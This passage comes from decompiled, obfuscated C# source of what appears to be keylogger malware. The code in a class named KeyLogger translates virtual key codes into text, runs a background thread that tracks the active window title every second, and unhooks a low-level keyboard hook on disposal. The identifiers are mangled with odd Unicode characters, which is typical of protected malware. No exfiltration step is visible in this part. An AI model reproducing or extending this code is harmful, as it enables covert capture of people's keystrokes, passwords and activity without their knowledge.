          Α\uFFFDǎŎ\uFFFD.ƚܣŁœ̮(VKCode, num1, numArray, stringBuilder, 5, 0U, num4);
          return stringBuilder.ToString();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        return ((Keys) checked ((int) VKCode)).ToString();
      }

      private void InitializeCaptionLogging() => new Thread((ThreadStart) (() =>
      {
        while (true)
        {
          StringBuilder stringBuilder = new StringBuilder(256);
          if (Α\uFFFDǎŎ\uFFFD.\u061D\uFFFDĂ߂߂(Α\uFFFDǎŎ\uFFFD.\uFFFD\uFFFD\uFFFD\uFFFDک(), stringBuilder, 256) > 0 && Operators.CompareString(stringBuilder.ToString(), this._currentWindow, false) != 0)
            this._currentWindow = stringBuilder.ToString();
          Thread.Sleep(1000);
        }
      })).Start();

      public void Dispose()
      {
        Α\uFFFDǎŎ\uFFFD.KeyLogger.UnHook(this._hook);
        GC.SuppressFinalize((object) this);
      }

      private delegate int KeyboardProc(int code, int direction, ref Keys key);
    }
  }
}
